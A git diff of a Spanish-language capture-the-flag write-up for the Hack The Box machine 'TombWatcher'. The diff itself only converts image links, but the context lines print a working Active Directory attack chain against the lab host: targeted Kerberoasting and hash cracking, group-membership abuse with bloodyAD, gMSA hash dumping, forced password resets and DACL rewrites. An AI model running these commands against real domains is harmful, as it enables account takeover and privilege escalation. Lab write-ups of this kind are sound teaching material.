@@ -72,7 +72,9 @@ bloodhound-python -u henry -p 'H3nry_987TGV!' -c All -d tombwatcher.htb -ns 10.1
 ~~~
 ### Jugando con BloodHound
 Al subir los archivos a bloodhound se puede ver que henry tiene permisos sobre alfred
-![[1.jpg]]
+
+![](1.jpg)
+
 Esto da a lugar a un ataque de kerberoasting, por lo que se usa impacket para dicho proposito, capturando su hash y descifrandolo usando john the ripper
 ~~~bash
 python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
@@ -96,12 +98,16 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ~~~
 Continuando con bloodhound, con alfred se puede ver que tiene permisos Generic All sobre un grupo, asi que seria conveniente añadirse a dicho grupo y heredar sus privilegios, esto se hará con bloodyAD (herramienta poderosa para AD)
-![[2.jpg]]
+
+![](2.jpg)
+
 ~~~bash
 bloodyAD -d tombwatcher.htb --host 10.10.11.72 -u alfred -p '&lt;MetaContraseña&gt;' add groupMember 'INFRASTRUCTURE' alfred</code></pre><pre><code>[+] alfred added to INFRASTRUCTURE
 ~~~
 Con el usuario añadido, se puede ver los privilegios del grupo y muestra que puede ver credenciales GMSA de otro usuario
-![[3.jpg]]
+
+![](3.jpg)
+
 ~~~ bash
 sudo netexec ldap 10.10.11.72 -u alfred -p '<MetaContraseña>' --gmsa             
 SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)                                                                                                                                                    
@@ -110,13 +116,17 @@ LDAPS       10.10.11.72     636    DC01             [*] Getting GMSA Passwords
 LDAPS       10.10.11.72     636    DC01             Account: ansible_dev$         NTLM: <SNIP>
 ~~~
 Con este usuario se puede ver que tiene permisos de cambio de contraseña sobre el usuario sam
-![[4.jpg]]
+
+![](4.jpg)
+
 ~~~bash
 bloodyAD -u "ansible_dev$" -p :4f&lt;SNIP&gt;f4 -d "tombwatcher.htb" --host 10.10.11.72 set password "sam" 'password123!'
 [+] Password changed successfully!
 ~~~
 Continuando la busqueda en bloodhound, se pudo ver que el usuario sam tiene permisos WriteOwner sobre john por lo que se le puede añadir mas permisos como generic all y luego cambiar credenciales
-![[5.jpg]]
+
+![](5.jpg)
+
 ~~~ bash
 dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'password123!'
 /home/kali/.local/bin/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
@@ -192,7 +202,9 @@ Evil-WinRM PS C:\Users\john\desktop> type user.txt
 
 ### Escalada de Privilegios
 En este punto, se vio algo raro revisando bloodhound, se ve que el usuario john tiene permisos sobre una unidad organizacional pero al revisar esta no tienen ningun objeto creado, por lo que se piensa que puede ser posible que haya tenido objetos asociados pero se hayan eliminado
-![[6.jpg]]
+
+![](6.jpg)
+
 Entonces primero tomamos mas control sobre la unidad organizacional
 ~~~ bash
 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'test123!'
